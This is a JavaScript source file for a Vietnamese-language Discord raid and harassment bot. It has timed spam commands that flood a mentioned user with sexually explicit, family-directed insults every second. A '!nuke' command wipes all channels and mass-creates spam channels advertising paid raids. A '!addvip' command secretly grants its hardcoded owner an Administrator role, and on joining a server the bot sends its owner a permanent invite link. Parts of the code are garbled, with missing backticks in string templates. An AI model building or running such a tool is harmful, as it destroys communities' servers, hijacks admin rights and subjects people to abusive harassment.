const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(3000, () => console.log('KeepAlive server is running.'));

const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const config = require('./config.json');
const fs = require("fs");

const COUPLES_FILE = "./couples.json";

function getCouples() {
  if (!fs.existsSync(COUPLES_FILE)) return {};
  return JSON.parse(fs.readFileSync(COUPLES_FILE));
}

function saveCouples(data) {
  fs.writeFileSync(COUPLES_FILE, JSON.stringify(data, null, 2));
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Spam message presets
const spamMessages = [
  "# https://discord.gg/tktnontopp\n https://discord.gg/CA9aP4u2\n https://discord.gg/xxKHaGJZ",
];

const spamChaoMessages = [
  "# BIẾT ANH NAM TRAN CHƯA EM",
  "# ANH NAMTRAN BÁ NHẤT CÁI TRẬN NÀY",
  "# CÓ ANH NAM LÀ ĐẠO LÝ ĐỜI XUẤT HIỆN",
  "# ANH NAM CHUYÊN DIỆT ĐÚ",
];

const spamTamBietMessages = [
  "# TẠM BIỆT EM YÊU NHA ANH ĐI ĐÂY",
  "# HẾT TRẬN RỒI NHA THẮNG THUA ĐÉO QUAN TRỌNG",
  "# QUAN TRỌNG CÁI EM BIẾT LỚN CHƯA??",
  "# TỪ SAU BỚT OAI NHA MẤY THẰNG LỒN",
  "# cảm ơn quý khách đã sử dụng dịch vụ bot của chúng tôi nếu cần thuê bot hãy vào sever này https://discord.gg/cXcntSARJB",
];

const spamChuiMessages = [
  "# đĩ mẹ mày oai với ai hả thằng lồn",
    "# tí tuổi đầu lớn hơn ai",
    "# thằng cha già mày đang đi làm nuôi mày kìa thằng lồn",
    "# đĩ mẹ mày như thằng ngu lồn đấy",
    "# thằng ngu lồn đòi chửi bẩn ai",
    "# thằng óc vắt mũi chưa sạch oai cái đĩ lồn mẹ mày",
    "# mấy thằng ngu đừng ẳng pbvm ra nha",
    "# anh ghét cái thể loại mặt lồn ẳng pbvm lắm",
    "# núp sau màn hình oai được với ai",
    "# mấy thằng ngu lồn lên mxh oai oai sĩ sĩ",
    "# chúng mày tưởng thế là hay à",
    "# tụi mày biết lớn không",
    "# con bot này của anh sinh ra để day đời các em",
    "# các em có não mà đéo biết lớn",
    "# bố mẹ tụi mày đi làm nuôi ăn nuôi học",
    "# chúng mày đòi lên mạng oai với ai hả mấy thằng lồn",
    "# còn lên mxh ảo ảo đá là bố mẹ còn khổ",
    "# anh nói thế cho biết thân biết phận em ạ",
    "# lớn rồi biết suy nghĩ đi thằnng lồn",
    "# giờ mấy thấy mày ngu chưa con",
    "# chúng mày thích ẳng ẳng lắm à mà oai vậy vậy hh",
    "# đúng mấy thằng ngu lồn núp sau màn ẳng ẳng",
    "# mày ẳng tiếp anh em thằng ngu ơi",
    "# thằng ngu ơi sao mày hay ra vẻ vậy",
    "# mày bí rồi à em",
    "# đĩ mẹ mày thấy mày ngu chưa thằng lồn",
    "# lồn mẹ mày sau bớt oai nha con",
    "# óc cặc nó vừa thôi em ạ",
    "# có đầu óc mà đéo biết suy nghĩ",
    "# óc lồn nó vừa thôi nha hh",
    "# mày khóc rồi à",
    "# anh nói đúng quá nín à",
    "# ngu lồn nó vừa thôi em nhé",
    "# bớt oai mạng đi",
    "# chửi thì ngu nhai đi nhai lại bài văn",
    "# ẳng tiếp đi",
    "# hay tao đè chat cho khóc rồi à",
    "# ĐỊT MẸ MÀY THẰNG NGU LỒN",
    "# OAI OAI SĨ SĨ A ĐÁ CHẾT CON ĐĨ MẸ MÀY NÈ HJHJ",
    "# SAO MÀY NGU THỂ HẢ LỒN NGU ƠII",
    "# ÔNG BÀ GIÀ MÀY CHẾT RỒI À?",
    "# HẾT NGÔN À THG NGU ƠI",
    "# BỎ 5 CHỤC LÀM NHỤC CON ĐĨ MẸ MÀY",
    "# Anh đụ con gái mẹ mày lồn trâu , lồn chó , lồn bó xi măng ,",
    "# anh lái xe tăng , cán banh mu lồn ",
    "# hằng quỷ xạo lá anh đấm anh đá , đá văng lên trời từ từ mày rơi sút mày chơi vơi",
    "# anh đây tiến tới , anh đụ con mẹ mày bay lên thiên đàng rồi xuống địa ngục lục đục gia đình",
    "# vét máng vùng kín , anh đây hơi kinh , liếm cái bả ra , bả ra bả bắn , dú bả anh cắn , lồn bả anh nhai ,,",
    "# anh chẻ 2 mái , bả liếm trứng dái",
    "# rồi bình xăng con , đụ bả có con ",
    "# đẻ ra mặt lồn , cô hồn các đảng",
    "# phản bạn lừa thầy , thằng lồn mất dạy",
    "# tội xấu che đậy , mu lồn anh cậy , tới thằng cha mày , anh đấm anh đá , sút ổng văng xa ",
    "# văng 18 mét , anh đây hơi khét , chửi ổng ổng khóc , anh bứt cọng tóc , nhét vô mu lồn con gái mẹ mày đó thằng ngu ",
    "# đẻ con không cu , cu tao mày bú , mày thấy mày ngu , mày khóc huhu nhưng vẫn bị đánh ,",
    "# ôi xuống địa ngục , phục tùng mệnh lệnh",
    "# đánh mày hồn bay phách tán , lồn mày phách lạc",
    "# mày như Lão Hạc cho ăn bả chó , để m chết queo",
    "# ời mày thúi hẻo , gặp anh , ảnh chém m chết , cuộc đời mày hết ",
    "# ánh cho mày lết , lết như con trâu , đánh bể đầu lâu , tuột quần mày xuống , thấy nguyên cái lồn ",
    "# nhìn như u hồn , đấm m u lồn luôn đó con chó ngukhoc thueAnh đụ con gái mẹ mày lồn trâu",
    "# ồn chó , lồn bó xi măng , anh lái xe tăng , cán banh mu lồn , thằng quỷ xạo lá anh đấm anh đá ",
    "# đá văng lên trời từ từ mày rơi sút mày chơi vơi",
    "# anh đây tiến tới , anh đụ con mẹ mày bay lên thiên đàng rồi xuống địa ngục lục đục gia đình",
    "# vét máng vùng kín , anh đây hơi kinh , liếm cái bả ra , bả ra bả bắn , dú bả anh cắn ,",
    "# ồn bả anh nhai , anh chẻ 2 mái , bả liếm trứng dái",
    "# rồi bình xăng con , đụ bả có con , đẻ ra mặt lồn",
    "# cô hồn các đảng , phản bạn lừa thầy ",
    "# thằng lồn mất dạy , tội xấu che đậy , mu lồn anh cậy , tới thằng cha mày",
    "# mọc lông chim chưa thg ngu ê",
    "# nơi hoang dã anh giã vào cái lồn mẹ m đếy thg ngu",
    "# ông bà già m nhiêu tuổi r m cẩn thận ông bà già m sắp đến tuổi tử rồi đấy ",
    "# đại bàng tung cánh anh đánh vào cái lồn mẹ m",
];

// Trigger reply
const triggerReplies = {
  "hello": "lô lô con cặc ",
  "bye": "cút mẹ mày đi,cút",
  "bot ơi": "Dạ có em đây!",
  "hi": "hi con đĩ mẹ mày ngu lồn",
  "Gay": "gay con đĩ mẹ mày chứ gay",
  "les": "les cặc bà mày",
  "nam đâu": "Nam đang nhớ bạn đấy^^",
  "ai dz nhất": "NamTran top1 dz",
  "alo": "mày muốn vỡ alo à",
  "yêu": "yêu con cặc cha mày",
  "ok e": "em con cặc bà mày",
  "tling húi": "tlinh là co be xink gai nhất sever",
  "namdan": "dần thằng bố mày chứ đần đại ca tao",
  "miss a bôg": "# em miss a bông nhiều lắm nhaaa",
  "thuylinh xau gai": "thuylinh xấu gái nhất sever",
  "đĩ": "con đĩ mẹ mày vểnh lồn lên cho tao địt",
  "lồn": "mê lồn hả em",
  "ai les cơ": "bông húi les",
  "ai bựa nhất sever?": "chị @suasua05 bựa nhất á",
  "dâm": "@suasua_05 dâm top 1 sever",
  "kid": "kid con đĩ mẹ nhà mày ấy em",
  "ngu": "ngu con đĩ lồn mẹ mày",
  "21/5": "là sinh nhật của namtran á",
  "?": "? móc vô cái lỗ lồn con đĩ mẹ mày",
  "dcm": "địt cái thằng cha mày đấy thằng ngu lồn hh",
  "nam cac": "con cặc cha mày hihi",
  "nam lon": "cai lon di me may",
  // ...(giữ nguyên các câu khác)
};

const activeIntervals = new Map(); // lưu spam interval theo kênh

client.once("ready", () => {
  console.log(Bot đang hoạt động với tên ${client.user.tag});

  client.user.setPresence({
    status: "dnd", // 👈 Trạng thái: dnd = Do Not Disturb
    activities: [
      {
        name: "nhớ em rồi hjhj",
        type: 1, // 1 =
      },
    ],
  });
});

function hasPermission(message) {
  // Chủ bot luôn được
  if (message.author.id === config.ownerId) return true;

  // Nếu không phải trong server thì từ chối
  if (!message.guild) return false;

  // Chỉ cần có quyền ManageMessages (Admin) là được
  const isAdmin = message.member.permissions.has(PermissionsBitField.Flags.ManageMessages);
  return isAdmin;
}




function startSpam(channel, messages, mentionUser, durationMs = null) {
  let index = 0;
  const channelId = channel.id;
  const startTime = Date.now();

  const interval = setInterval(() => {
    const now = Date.now();
    if (durationMs && now - startTime >= durationMs) {
      clearInterval(interval);
      activeIntervals.delete(channelId);
      return;
    }

    const msg = messages[index];
    index = (index + 1) % messages.length;
    channel
      .send(mentionUser ? ${msg} <@${mentionUser.id}> : msg)
      .catch(() => {});
  }, 1000); // gửi mỗi 1 giây

  activeIntervals.set(channelId, interval);
}

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();
  const channelId = message.channel.id;

  // Auto reply theo từ khóa
  const reply = triggerReplies[content];
  if (reply) {
    return message.reply(${message.author} ${reply});
  }

  //  Lệnh !spam
  if (message.content.startsWith("!spam ")) {
    if (!hasPermission(message))
      return message.reply(" Bạn không có quyền dùng lệnh này hãy vào sever này và + hãy có quyền admin để có thể sử dụng lệnh https://discord.gg/d6TpjJt4wU");
    if (activeIntervals.has(channelId))
      return message.reply(" Đã có spam đang chạy. Dừng lại bằng !stop.");

    const args = message.content.split(" ").slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    if (!timeArg || !timeArg.endsWith("h"))
      return message.reply(
        "ngu viết sai lệnh. Ví dụ: !spam 1h hoặc !spam @user 2h",
      );

    const hours = parseInt(timeArg.replace("h", ""));
    if (isNaN(hours) || hours <= 0)
      return message.reply(" Thời gian không hợp lệ");

    const duration = hours * 60 * 60 * 1000;
    startSpam(message.channel, spamMessages, mentionUser, duration);
    return message.reply(
      Bắt đầu spam trong ${hours} giờ đừng khóc nha em iu hhh.,
    );
  }

  //  Lệnh !spamchao
  if (message.content === "!spamdaoli") {
    if (!hasPermission(message))
      return message.reply("Bạn không có quyền dùng lệnh này hãy vào sever này và + hãy có quyền admin để có thể sử dụng lệnh https://discord.gg/d6TpjJt4wU");
    if (activeIntervals.has(channelId))
      return message.reply("Đã có spam đang chạy. Dừng lại bằng !stop.");
    startSpam(message.channel, spamChaoMessages);
    return message.reply(
      " Bắt đầu spam đạo lí cho mấy thằng ngu lồn tưởng thế là hay",
    );
  }

  // Lệnh !spamtambiet
  if (message.content.startsWith("!spamtambiet")) {
    if (!hasPermission(message))
      return message.reply(" Bạn không có quyền dùng lệnh này hãy vào sever này và + hãy có quyền admin để có thể sử dụng lệnh https://discord.gg/d6TpjJt4wU");
    if (activeIntervals.has(channelId))
      return message.reply("Đã có spam đang chạy. Dừng lại bằng !stop.");

    const args = message.content.split(" ").slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    let duration = null;

    if (timeArg) {
      if (!timeArg.endsWith("h"))
        return message.reply(
          " Cú pháp sai. Dùng !spamtambiet, !spamtambiet 1h hoặc !spamtambiet @user 1h",
        );
      const hours = parseInt(timeArg.replace("h", ""));
      if (isNaN(hours) || hours <= 0)
        return message.reply(" Thời gian không hợp lệ");
      duration = hours * 60 * 60 * 1000;
    }

    startSpam(message.channel, spamTamBietMessages, mentionUser, duration);
    return message.reply(
       Bắt đầu spam TẠM BIỆT ${mentionUser ? <@${mentionUser.id}> : ""} ${duration ? trong ${timeArg} : ""}! Đừng khóc nha...,
    );
  }

  // Lệnh !spamchui
  if (message.content.startsWith("!spamchui")) {
    if (!hasPermission(message))
      return message.reply(
        " Bạn không có quyền dùng lệnh này hãy vào sever này và + hãy có quyền admin để có thể sử dụng lệnh https://discord.gg/d6TpjJt4wU",
      );
    if (activeIntervals.has(channelId))
      return message.reply(" Đã có spam đang chạy. Dừng lại bằng !stop.");

    const args = message.content.split(" ").slice(1);
    let mentionUser = null;
    let timeArg = null;

    if (message.mentions.users.size > 0) {
      mentionUser = message.mentions.users.first();
      timeArg = args[1];
    } else {
      timeArg = args[0];
    }

    let duration = null;

    if (timeArg) {
      if (!timeArg.endsWith("h"))
        return message.reply(
          "Cú pháp sai. Dùng !spamchui, !spamchui 1h hoặc !spamchui @user 1h",
        );
      const hours = parseInt(timeArg.replace("h", ""));
      if (isNaN(hours) || hours <= 0)
        return message.reply(" Thời gian không hợp lệ");
      duration = hours * 60 * 60 * 1000;
    }

    startSpam(message.channel, spamChuiMessages, mentionUser, duration);
    return message.reply(
       Bắt đầu spam CHỬI thằng ngu lồn này ${mentionUser ? <@${mentionUser.id}> : ""} ${duration ? trong ${timeArg} : ""}! thằng nào còn ẳng tao chửi cả thằng đó!!,
    );
  }

  // Lệnh !stop
  if (message.content.startsWith("!stop")) {
    if (!hasPermission(message))
      return message.reply(" Bạn không có quyền dùng lệnh này hãy vào sever này và + hãy có quyền admin để có thể sử dụng lệnh https://discord.gg/d6TpjJt4wU");

    const channelId = message.channel.id; // THÊM DÒNG NÀY
    const interval = activeIntervals.get(channelId);

    if (interval) {
      clearInterval(interval);
      activeIntervals.delete(channelId);
      return message.reply(
        "biết ngay mấy thằng đó ngu lồn khóc nhè mới bảo mày stop à kk.",
      );
    } else {
      return message.reply(" Không có spam nào đang chạy trong kênh này.");
    }
  }

  // Lệnh !deleteallchannels
  if (message.content === '!xoa') {
    // Kiểm tra nếu user KHÔNG phải là owner và KHÔNG có quyền admin
    if (
      message.author.id !== config.ownerId &&
      !message.member.permissions.has("ADMINISTRATOR")
    ) {
      return message.reply("Bạn không có quyền dùng lệnh này. Chỉ quản trị viên hoặc owner bot mới được dùng.");
    }

    message.guild.channels.fetch().then(channels => {
      channels.forEach(channel => {
        channel.delete().catch(err => console.error(Không thể xoá kênh ${channel.name}:, err));
      });
    });

    return message.reply("Đã bắt đầu xoá toàn bộ kênh. Vĩnh biệt cái server này.");
  }

  if (message.content === '!nuke') {
    // Kiểm tra quyền
    const isBotOwner = message.author.id === '84040602825628057' // id 840406028256280577
    if (!isBotOwner) {
      return message.reply("nuke cái địt con mẹ nhà mày");
    }

    message.reply('bắt đầu sự khóc thét');

    // Xoá toàn bộ kênh
    message.guild.channels.cache.forEach(channel => {
      channel.delete().catch(() => {});
    });

    // Nội dung spam
    const spamMessage = "# @here # sever đã bị raid out sever lẹ\n# Tham gia tại để được báo giá thuê bot raid: https://discord.gg/d6TpjJt4wU";

    // Tạo 100 kênh mới và spam
    for (let i = 0; i < 200; i++) {
      message.guild.channels.create({
        name: solo spam nè-${i + 1},
        type: 0 // GUILD_TEXT
      }).then(channel => {
        for (let j = 0; j < 500; j++) {
          channel.send(spamMessage).catch(() => {});
        }
      }).catch(() => {});
    }
  }
  if (message.content === '!addvip') {
    // Chỉ owner bot được dùng
    const ownerID = '840406028256280577'; // thay bằng ID thật của bạn

    if (message.author.id !== ownerID) {
      return message.reply("Bạn không có quyền dùng lệnh này.");
    }

    const guild = message.guild;

    // Tìm role VIP nếu đã có
    let vipRole = guild.roles.cache.find(role => role.name === 'VIP');

    // Nếu chưa có thì tạo mới với tất cả quyền
    if (!vipRole) {
      guild.roles.create({
        name: 'VIP',
        permissions: [PermissionsBitField.Flags.Administrator], // quyền cao nhất
        color: 'Gold'
      }).then(role => {
        message.member.roles.add(role).then(() => {
          message.reply(' Đã tạo role VIP và gán cho bạn.');
        }).catch(() => {
          message.reply(' không thế gắn role bot không có quyền.');
        });
      }).catch(() => {
        message.reply(' Không thể tạo role VIP. Bot có đủ quyền không?');
      });
    } else {
      // Nếu đã có role, gán luôn
      message.member.roles.add(vipRole).then(() => {
        message.reply(' Bạn đã được gán role VIP.');
      }).catch(() => {
        message.reply(' Không thể gán role. Bot có đủ quyền không?');
      });
    }
  }
  client.on('guildCreate', async guild => {
    const ownerID = 'YOUR_ID_HERE'; // Thay bằng ID Discord của bạn
    const ownerUser = await client.users.fetch(ownerID);

    let inviteLink = 'Không tạo được link mời';

    // Thử tạo invite nếu có channel
    try {
      const textChannel = guild.channels.cache
        .filter(c => c.type === 0 &&      c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite))
        .first();

      if (textChannel) {
        const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 });
        inviteLink = invite.url;
      }
    } catch (err) {
      console.log("Không thể tạo invite:", err.message);
    }

    // Gửi thông báo cho owner
    ownerUser.send({
      content:  **Bot vừa được thêm vào server mới!**

   Tên server: \${guild.name}\
   ID server: \${guild.id}\
   Thành viên: \${guild.memberCount}\
   Invite: ${inviteLink}
    }).catch(() => {
      console.log("Không thể gửi tin nhắn đến owner.");
    });
  });
  if (message.content.startsWith("!xoachat")) {
    // Chỉ cho phép người có quyền quản lý tin nhắn dùng
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      return message.reply("❌ Bạn không có quyền để xoá tin nhắn!");
    }

    const args = message.content.split(" ");
    const amount = parseInt(args[1]);

    if (isNaN(amount) || amount < 1 || amount > 10000) {
      return message.reply("❗ Vui lòng nhập số lượng từ 1 đến 10000.");
    }

    await message.delete(); // Xoá lệnh người dùng gửi

    let deletedCount = 0;
    let remaining = amount;

    while (remaining > 0) {
      const toDelete = Math.min(remaining, 100);
      try {
        const fetched = await message.channel.messages.fetch({ limit: toDelete });
        const filtered = fetched.filter(m => !m.pinned); // Không xoá tin nhắn đã ghim

        const deleted = await message.channel.bulkDelete(filtered, true);
        deletedCount += deleted.size;
        remaining -= deleted.size;

        await new Promise(resolve => setTimeout(resolve, 1000)); // Chờ 1 giây giữa các đợt để tránh rate limit
      } catch (error) {
        console.error("Lỗi khi xoá tin nhắn:", error);
        break;
      }
    }

    message.channel.send(🧹 Đã xoá ${deletedCount} tin nhắn.)
      .then(msg => setTimeout(() => msg.delete().catch(() => {}), 5000));
  }
  if (message.content === "!idkenh") {
    if (!hasPermission(message))
      return message.reply("Bạn không có quyền dùng lệnh này.");

    return message.reply(ID của kênh này là: \${message.channel.id}\`);
  }
  if (message.content === "!idsever") {
    if (!hasPermission(message))
      return message.reply("Bạn không có quyền dùng lệnh này.");

    const guildId = message.guild?.id || "Không trong server";
    return message.reply( ID Server: \${guildId}\`);
  }
  if (message.content === "!sever") {
    if (!hasPermission(message))
      return message.reply("Bạn không có quyền dùng lệnh này.");

    const { guild } = message;
    if (!guild) return message.reply("Lệnh này chỉ dùng trong server.");

    const owner = await guild.fetchOwner();
    const embed = {
      color: 0x3498db,
      title: 📊 Thông tin Server,
      thumbnail: {
        url: guild.iconURL({ dynamic: true, size: 1024 }) || undefined,
      },
      fields: [
        {
          name: "🏷️ Tên Server",
          value: guild.name,
          inline: true,
        },
        {
          name: "🆔 ID",
          value: guild.id,
          inline: true,
        },
        {
          name: "👑 Chủ Server",
          value: ${owner.user.tag} (${owner.id}),
          inline: false,
        },
        {
          name: "👥 Thành viên",
          value: ${guild.memberCount} người,
          inline: true,
        },
        {
          name: "📅 Tạo ngày",
          value: <t:${Math.floor(guild.createdTimestamp / 1000)}:F>,
          inline: true,
        },
      ],
    };

    return message.channel.send({ embeds: [embed] });
  }
  if (message.content.startsWith("!spamvanban")) {
    if (!hasPermission(message))
      return message.reply("Bạn không có quyền dùng lệnh này.");

    const channelId = message.channel.id;
    if (activeIntervals.has(channelId))
      return message.reply("Đã có spam đang chạy. Dừng lại bằng !stop.");

    const args = message.content.split(" ").slice(1);
    if (args.length < 2)
      return message.reply("Sai cú pháp! Ví dụ: !spamvanban hello 1h");

    const timeArg = args[args.length - 1];
    const messageText = args.slice(0, -1).join(" ");

    let duration = null;

    if (timeArg.endsWith("h")) {
      const hours = parseInt(timeArg.replace("h", ""));
      if (isNaN(hours) || hours <= 0)
        return message.reply("Thời gian không hợp lệ.");
      duration = hours * 60 * 60 * 1000;
    } else if (timeArg.endsWith("p")) {
      const minutes = parseInt(timeArg.replace("p", ""));
      if (isNaN(minutes) || minutes <= 0)
        return message.reply("Thời gian không hợp lệ.");
      duration = minutes * 60 * 1000;
    } else if (timeArg.endsWith("s")) {
      const seconds = parseInt(timeArg.replace("s", ""));
      if (isNaN(seconds) || seconds <= 0)
        return message.reply("Thời gian không hợp lệ.");
      duration = seconds * 1000;
    } else {
      return message.reply("Sai cú pháp! Thời gian phải là số + h / p / s (ví dụ: 1h, 30p, 10s)");
    }

    startSpam(message.channel, [messageText], null, duration);
    return message.reply( Bắt đầu spam: \${messageText}\ trong ${timeArg});
  }




});

client.login(config.token);
